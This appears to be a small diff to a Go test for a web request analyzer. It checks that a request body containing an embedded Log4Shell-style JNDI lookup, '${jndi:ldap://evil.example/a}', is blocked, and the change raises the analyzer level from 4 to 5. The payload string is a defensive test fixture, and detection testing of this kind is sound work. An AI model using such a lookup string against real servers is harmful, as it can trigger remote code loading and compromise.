@@ -134,7 +134,7 @@ func TestRecallHardeningEmbeddedJNDIBlockedAtParanoid(t *testing.T) {
 		t.Fatal(err)
 	}
 	reqCtx.DecodedBody = []byte("note ${jndi:ldap://evil.example/a} in logs")
-	got, err := NewAnalyzer("block", 4).Detect(context.Background(), reqCtx)
+	got, err := NewAnalyzer("block", 5).Detect(context.Background(), reqCtx)
 	if err != nil {
 		t.Fatal(err)
 	}
